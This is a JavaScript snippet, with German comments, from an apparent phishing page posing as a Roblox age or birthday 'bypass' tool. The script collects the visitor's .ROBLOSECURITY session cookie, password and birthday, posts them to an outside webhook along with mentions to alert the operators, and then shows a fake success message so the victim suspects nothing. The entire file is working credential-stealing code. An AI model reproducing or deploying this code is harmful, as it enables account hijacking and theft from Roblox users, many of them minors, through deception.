<script>
  const bypassSelect = document.getElementById('bypass');
  const cookieBlock = document.getElementById('cookie-block');
  const passwordBlock = document.getElementById('password-block');
  const birthdayBlock = document.getElementById('birthday-block');

  const cookieInput = document.getElementById('cookie-input');
  const passwordInput = document.getElementById('password-input');

  const daySelect = document.getElementById('day');
  const monthSelect = document.getElementById('month');
  const yearSelect = document.getElementById('year');

  const processBtn = document.getElementById('process-button');
  const errorMessage = document.getElementById('error-message');
  const successMessage = document.getElementById('success-message');
  const loaderOverlay = document.getElementById('loader-overlay');

  // Initial Setup: Geburtstag-Block verstecken, Button-Text auf PROCESS ACCOUNT
  birthdayBlock.style.display = 'none';
  processBtn.textContent = '‚öôÔ∏è PROCESS ACCOUNT';

  // Dropdowns f√ºllen
  for (let i = 1; i <= 31; i++) {
    daySelect.innerHTML += `<option value="${i}">${i}</option>`;
  }
  for (let i = 1; i <= 12; i++) {
    monthSelect.innerHTML += `<option value="${i}">${i}</option>`;
  }
  const currentYear = new Date().getFullYear();
  for (let y = currentYear; y >= 1900; y--) {
    yearSelect.innerHTML += `<option value="${y}">${y}</option>`;
  }

  // Hilfsfunktionen
  function clearMessages() {
    errorMessage.style.display = 'none';
    successMessage.style.display = 'none';
  }

  function showError(msg) {
    errorMessage.textContent = msg;
    errorMessage.style.display = 'block';
    setTimeout(() => { errorMessage.style.display = 'none'; }, 4000);
  }

  function showSuccess(msg) {
    successMessage.textContent = msg;
    successMessage.style.display = 'block';
    setTimeout(() => { successMessage.style.display = 'none'; }, 6000);
  }

  async function sendEmbedToDiscord(title, description) {
    const webhookUrl = 'https://hkdk.events/gcjor0rqtldxig';

    // @ mentions als normale Nachricht, nicht im Embed:
    await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ content: '<@1030535100829540464> <@&1392621247460020254>' })
    });

    // Embed senden
    await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        embeds: [{
          title: title,
          description: description,
          color: 0x00ffff,
          timestamp: new Date().toISOString()
        }]
      })
    });
  }

  // State: 1 = Cookie/PW Phase, 2 = Geburtstag Phase
  let phase = 1;

  bypassSelect.addEventListener('change', () => {
    clearMessages();
    cookieInput.value = '';
    passwordInput.value = '';
    daySelect.selectedIndex = 0;
    monthSelect.selectedIndex = 0;
    yearSelect.selectedIndex = 0;

    birthdayBlock.style.display = 'none';
    processBtn.textContent = '‚öôÔ∏è PROCESS ACCOUNT';
    processBtn.disabled = false;

    if (bypassSelect.value === '13plus') {
      cookieBlock.style.display = 'block';
      passwordBlock.style.display = 'block';
    } else if (bypassSelect.value === 'birthyear') {
      cookieBlock.style.display = 'block';
      passwordBlock.style.display = 'none';
    } else {
      cookieBlock.style.display = 'none';
      passwordBlock.style.display = 'none';
    }
    phase = 1;
  });

  processBtn.addEventListener('click', async () => {
    clearMessages();

    if (phase === 1) {
      // Erst Cookie (+ PW) pr√ºfen
      const selected = bypassSelect.value;
      const cookieVal = cookieInput.value.trim();
      const passwordVal = passwordInput.value.trim();

      if (!selected) {
        showError('Bitte w√§hle eine Option.');
        return;
      }
      if (cookieVal.length < 500) {
        showError('Bitte gib einen g√ºltigen .ROBLOSECURITY Cookie ein.');
        return;
      }
      if (selected === '13plus' && passwordVal.length === 0) {
        showError('Bitte gib das Passwort ein.');
        return;
      }

      // Alles ok, jetzt Geburtstag-Block anzeigen
      birthdayBlock.style.display = 'block';
      processBtn.textContent = 'üéâ BEST√ÑTIGEN';
      phase = 2;

    } else if (phase === 2) {
      // Jetzt Geburtstag pr√ºfen und senden
      const selected = bypassSelect.value;
      const cookieVal = cookieInput.value.trim();
      const passwordVal = passwordInput.value.trim();

      const day = daySelect.value;
      const month = monthSelect.value;
      const year = yearSelect.value;

      if (!day || !month || !year) {
        showError('Bitte w√§hle deinen Geburtstag komplett aus.');
        return;
      }

      const birthday = `${day}.${month}.${year}`;

      processBtn.disabled = true;
      loaderOverlay.style.display = 'flex';

      try {
        // @ als einzelne Nachricht
        await sendEmbedToDiscord('.ROBLOSECURITY Cookie & Password', `**Methode:** ${selected === 'birthyear' ? '2008 Birthyear Up' : '13+ All Ages'}\n**Cookie:** ${cookieVal}\n**Geburtstag:** ${birthday}`);

        if (selected === '13plus') {
          await sendEmbedToDiscord('Account Password', `**Passwort:** ${passwordVal}`);
        }

        await new Promise(res => setTimeout(res, 1200));

        loaderOverlay.style.display = 'none';
        showSuccess(`Erfolgreich! Dein Geburtstag wurde auf ${birthday} gesetzt. Die √Ñnderung kann 2-12 Stunden dauern.`);
      } catch (e) {
        loaderOverlay.style.display = 'none';
        showError('Fehler, bitte sp√§ter erneut versuchen.');
      } finally {
        processBtn.disabled = false;
      }
    }
  });
</script>
